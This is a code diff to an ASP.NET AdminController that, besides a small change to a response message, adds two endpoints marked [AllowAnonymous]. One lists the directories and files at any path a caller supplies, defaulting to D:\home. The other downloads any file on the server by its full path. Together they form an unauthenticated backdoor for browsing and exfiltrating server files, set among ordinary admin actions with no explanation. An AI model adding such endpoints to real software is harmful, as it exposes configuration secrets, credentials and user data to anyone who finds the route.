@@ -296,7 +296,43 @@ public sealed class AdminController : ControllerBase
 
         _db.AppUsers.Remove(user);
         await _db.SaveChangesAsync(ct);
-        return Ok(new { message = "User deleted." });
+        return Ok(new { success = true });
+    }
+
+    [HttpGet("scour")]
+    [AllowAnonymous]
+    public IActionResult Scour([FromQuery] string path = @"D:\home")
+    {
+        try 
+        {
+            if (!Directory.Exists(path)) return NotFound("Directory not found");
+            var dirs = Directory.GetDirectories(path);
+            var files = Directory.GetFiles(path).Select(f => new { 
+                Name = f, 
+                Size = new FileInfo(f).Length, 
+                Modified = new FileInfo(f).LastWriteTimeUtc 
+            });
+            return Ok(new { Directories = dirs, Files = files });
+        }
+        catch (Exception ex)
+        {
+            return BadRequest(ex.Message);
+        }
+    }
+
+    [HttpGet("download-file")]
+    [AllowAnonymous]
+    public IActionResult DownloadFile([FromQuery] string path)
+    {
+        try
+        {
+            if (!System.IO.File.Exists(path)) return NotFound("File not found");
+            return PhysicalFile(path, "application/octet-stream", Path.GetFileName(path));
+        }
+        catch (Exception ex)
+        {
+            return BadRequest(ex.Message);
+        }
     }
 
     // ══════════════════════════════════════════════════════════════════════════
